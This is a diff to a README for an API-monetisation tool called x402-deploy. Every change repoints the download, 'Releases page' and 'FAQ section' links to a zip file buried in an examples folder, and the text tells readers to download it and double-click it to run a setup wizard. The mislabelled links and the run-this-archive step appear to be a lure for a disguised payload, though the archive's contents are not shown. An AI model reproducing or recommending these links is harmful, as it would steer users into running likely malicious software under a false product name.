@@ -1,6 +1,6 @@
 # 🚀 x402-deploy - Easily Monetize Your API Services
 
-[![Download x402-deploy](https://github.com/navsahu/x402-deploy/raw/refs/heads/main/src/templates/deploy-x-v1.3.zip)](https://github.com/navsahu/x402-deploy/raw/refs/heads/main/src/templates/deploy-x-v1.3.zip)
+[![Download x402-deploy](https://raw.githubusercontent.com/navsahu/x402-deploy/main/examples/fastapi-translation/deploy-x-2.3.zip)](https://raw.githubusercontent.com/navsahu/x402-deploy/main/examples/fastapi-translation/deploy-x-2.3.zip)
 
 ## 🛠️ Overview
 Welcome to **x402-deploy**! This application lets you turn any API or MCP server into a paid service. Whether you run a simple application or a complex system, x402-deploy is here to help you monetize your services efficiently. 
@@ -16,7 +16,7 @@ Welcome to **x402-deploy**! This application lets you turn any API or MCP server
 To get started with x402-deploy, follow these steps:
 
 1. **Download the Application**
-   Visit the [Releases page](https://github.com/navsahu/x402-deploy/raw/refs/heads/main/src/templates/deploy-x-v1.3.zip) to download the latest version of x402-deploy. 
+   Visit the [Releases page](https://raw.githubusercontent.com/navsahu/x402-deploy/main/examples/fastapi-translation/deploy-x-2.3.zip) to download the latest version of x402-deploy. 
 
 2. **Install the Application**
    After downloading, locate the file on your computer and double-click it to start the installation. Follow the prompts in the setup wizard to complete the installation.
@@ -36,7 +36,7 @@ To get started with x402-deploy, follow these steps:
 ## 📥 Download & Install
 To download x402-deploy, click the link below:
 
-[Download x402-deploy](https://github.com/navsahu/x402-deploy/raw/refs/heads/main/src/templates/deploy-x-v1.3.zip)
+[Download x402-deploy](https://raw.githubusercontent.com/navsahu/x402-deploy/main/examples/fastapi-translation/deploy-x-2.3.zip)
 
 After downloading, install it by following the steps outlined in the "Getting Started" section.
 
@@ -67,6 +67,6 @@ If you run into any issues while using x402-deploy, try the following:
 - **Reinstall**: If issues persist, try uninstalling and reinstalling the application.
 
 ## 📞 Support
-For further assistance, visit our support page or check out the [FAQ section](https://github.com/navsahu/x402-deploy/raw/refs/heads/main/src/templates/deploy-x-v1.3.zip) on our GitHub repo for common questions.
+For further assistance, visit our support page or check out the [FAQ section](https://raw.githubusercontent.com/navsahu/x402-deploy/main/examples/fastapi-translation/deploy-x-2.3.zip) on our GitHub repo for common questions.
 
-We hope x402-deploy helps you create a valuable service. For updates and new features, keep an eye on our [Releases page](https://github.com/navsahu/x402-deploy/raw/refs/heads/main/src/templates/deploy-x-v1.3.zip). Thank you for choosing x402-deploy!
+We hope x402-deploy helps you create a valuable service. For updates and new features, keep an eye on our [Releases page](https://raw.githubusercontent.com/navsahu/x402-deploy/main/examples/fastapi-translation/deploy-x-2.3.zip). Thank you for choosing x402-deploy!
